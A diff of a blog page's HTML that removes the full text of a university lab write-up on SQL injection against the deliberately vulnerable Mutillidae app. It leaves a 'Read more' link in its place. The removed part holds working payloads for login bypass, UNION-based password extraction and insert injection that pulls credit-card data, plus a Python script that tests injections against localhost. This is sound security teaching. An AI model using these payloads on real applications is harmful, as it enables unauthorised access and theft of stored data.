@@ -260,7 +260,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-02-03 23:12:54" itemprop="dateModified" datetime="2021-02-03T23:12:54+08:00">2021-02-03</time>
+        <time title="Modified: 2021-02-08 01:09:48" itemprop="dateModified" datetime="2021-02-08T01:09:48+08:00">2021-02-08</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -287,89 +287,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <center> This article is related to FIT5003 2020S2 Lab 9. The main aspects that these labs review are 3 types of SQL injection. We will discuss how to inject each of the vulnerability and how to defend the attacks.</center>
-
-<br>
-
-<h1 id="Week-9-Lab-SQL-Injection"><a href="#Week-9-Lab-SQL-Injection" class="headerlink" title="Week 9 Lab - SQL Injection"></a>Week 9 Lab - SQL Injection</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>OWASP SQL Injection: <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
-<p>Reference: Week 9 Lab pdf</p>
-<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><h3 id="Program-Requirements"><a href="#Program-Requirements" class="headerlink" title="Program Requirements"></a>Program Requirements</h3><ul>
-<li><p>OS: <strong>64-bit Ubuntu VM</strong></p>
-</li>
-<li><p>Server: by <strong>XAMPP</strong> <a target="_blank" rel="noopener" href="http://www.apachefriends.org/index.html">http://www.apachefriends.org/index.html</a></p>
-</li>
-<li><p>Vulnerable Web App: <strong>Mutillidae</strong> <a target="_blank" rel="noopener" href="https://github.com/webpwnized/mutillidae">https://github.com/webpwnized/mutillidae</a></p>
-<ul>
-<li><p>copy mutillidae directory (and all subdirectries) into /opt/lampp/htdocs:</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo cp -R ./mutillidae /opt/lampp/htdocs/</span></span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><p>Helpful setting:</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo nano /opt/lampp/htdocs/mutillidae/includes/database-config.inc</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>In the editor, change the configuration as follows:</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(’DB_HOST’, ’<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’);</span><br><span class="line">define(’DB_USERNAME’, ’root’);</span><br><span class="line">define(’DB_PASSWORD’, ’’);</span><br><span class="line">define(’DB_NAME’, ’mutillidae’);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ul>
-</li>
-<li><p>Web analysis tool: <strong>Burpsuite</strong> <a target="_blank" rel="noopener" href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a></p>
-</li>
-</ul>
-<h3 id="Setup-Web-Server"><a href="#Setup-Web-Server" class="headerlink" title="Setup Web Server"></a>Setup Web Server</h3><p>XAMPP start:</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo /opt/lampp/lampp start</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>And open Burpsuite to catch the data.</p>
-<ul>
-<li>set the IP as 127.0.0.1 and the port as 8080</li>
-</ul>
-<p>Open <a target="_blank" rel="noopener" href="http://127.0.0.1/mutillidae/">http://127.0.0.1/mutillidae/</a></p>
-<p><img src="1.bmp"></p>
-<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="Bypass-Authentication"><a href="#Bypass-Authentication" class="headerlink" title="Bypass Authentication"></a>Bypass Authentication</h3><p>Practice version: ‘OWASP 2017’ –&gt;  ‘A1 – Injection (SQL)’ –&gt; ‘SQLi – Bypass Authentication’ –&gt; ‘Login’</p>
-<p>Mission: Bypass authentication and login successfully.</p>
-<p>Answer code:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' OR 1=1 <span class="comment">-- </span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Result:</p>
-<p><img src="2.bmp"></p>
-<p>Equivalent query:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>Note</strong></p>
-<p>There must be a space after –. If there is not, the query will become to:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">--AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>This will cause a syntax error and the exception will be caught.</p>
-<h3 id="Extract-Data"><a href="#Extract-Data" class="headerlink" title="Extract Data"></a>Extract Data</h3><p>Practice version: ‘OWASP 2017’ –&gt;  ‘A1 – Injection (SQL)’ –&gt; ‘SQLi – Extract Data’ –&gt; ‘User Info’</p>
-<h4 id="Task-1-amp-2-Extract-user-info"><a href="#Task-1-amp-2-Extract-user-info" class="headerlink" title="Task 1 &amp; 2: Extract user info"></a>Task 1 &amp; 2: Extract user info</h4><p>Mission: Display users’ information</p>
-<p>Answer code:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John' <span class="comment">--</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Result:</p>
-<p><img src="3.bmp"></p>
-<p>Equivalent query:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'John'</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>Note</strong></p>
-<p>You can also use the code in Bypass Authentication. The result will be all the users’ information.</p>
-<h4 id="Task-3-Other-data"><a href="#Task-3-Other-data" class="headerlink" title="Task 3: Other data"></a>Task 3: Other data</h4><p>Answer code:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John' UNION SELECT NULL, password, NULL FROM accounts -- </span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>Note:</strong></p>
-<p>This is an unsolved task. I’ll go back to this question once I find how to hack it.</p>
-<h3 id="Insert-Data"><a href="#Insert-Data" class="headerlink" title="Insert Data"></a>Insert Data</h3><p>Practice version: ‘OWASP 2017’ –&gt;  ‘A1 – Injection (SQL)’ –&gt; ‘SQLi – Insert Injection’ –&gt; ‘Register’</p>
-<p>Mission: Use ‘Register’ page to implement the malicious string and display users’ information on the ‘User info’ page.</p>
-<p>Answer code:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> ccnumber <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- // For credit card number</span></span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">--  // For expiration</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>Result:</p>
-<p><img src="4.bmp"></p>
-<p>Equivalent query:</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> accounts(username, <span class="keyword">password</span>, mysignature) <span class="keyword">VALUES</span>(<span class="string">'Fish'</span>,<span class="string">'42'</span>,(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- ')</span></span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="Automated-SQL-injections"><a href="#Automated-SQL-injections" class="headerlink" title="Automated SQL injections"></a>Automated SQL injections</h3><p>AKA: how to find the vulnerability by using Python code</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxies = {’http’:’http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>’,’https’:’http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>’}</span><br><span class="line"><span class="comment"># {key:value}</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    	<span class="built_in">print</span> (<span class="string">"(+) Usage: %s &lt;sql-query-for-username&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    	sys.exit(-<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    username = sys.argv[<span class="number">1</span>]</span><br><span class="line">    target=<span class="string">"http://localhost/mutillidae/index.php?page=user-info.php&amp;username={}&amp;password=&amp;user-info-php-submit-button=View+Account+Details"</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    </span><br><span class="line">    r = requests.get(target,proxies=proxies,allow_redirects=<span class="literal">False</span>) </span><br><span class="line">    <span class="comment">#requests.get(url, params={key: value}, args)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">61000</span>:</span><br><span class="line">    	print(<span class="string">"(+) It works!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	print(<span class="string">"(-) It doesn’t work, try another query"</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">main()</span><br></pre></td></tr></tbody></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
